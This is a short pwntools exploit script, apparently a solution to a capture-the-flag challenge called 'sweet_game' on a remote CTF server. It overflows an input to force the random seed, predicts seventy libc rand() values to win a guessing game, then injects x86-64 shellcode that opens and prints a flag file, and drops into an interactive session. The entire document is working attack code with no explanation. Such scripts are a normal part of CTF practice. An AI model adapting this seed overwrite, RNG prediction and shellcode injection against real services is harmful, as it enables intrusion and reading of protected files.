from pwn import *
from ctypes import *

context.arch = 'x86_64'

libc = cdll.LoadLibrary("/lib/x86_64-linux-gnu/libc.so.6")
libc.srand(2)

#sh = process("./sweet_game")
sh = remote("challenge.bugpwn.com",1001)

sh.sendlineafter(b"the system: ",b"A"*10 + p32(2))
sh.sendlineafter(b"code to proceed: ",b"uyscuti")


for i in range(70):
	payload = str((libc.rand() + 8) % 0x14 + 1)
	print(f"PAYLOAD {payload}")
	sh.sendlineafter(b"from 1 to 20:",payload.encode())
	
print(sh.recvuntil(b"game: "))

shellcode = shellcraft.openat(0, "/home/ctf/flag.txt")
shellcode += shellcraft.sendfile(1, 'rax', 0, 0xffff)

print(f"LENGHT : {len(shellcode)}")
sh.sendline(asm(shellcode))

sh.interactive()
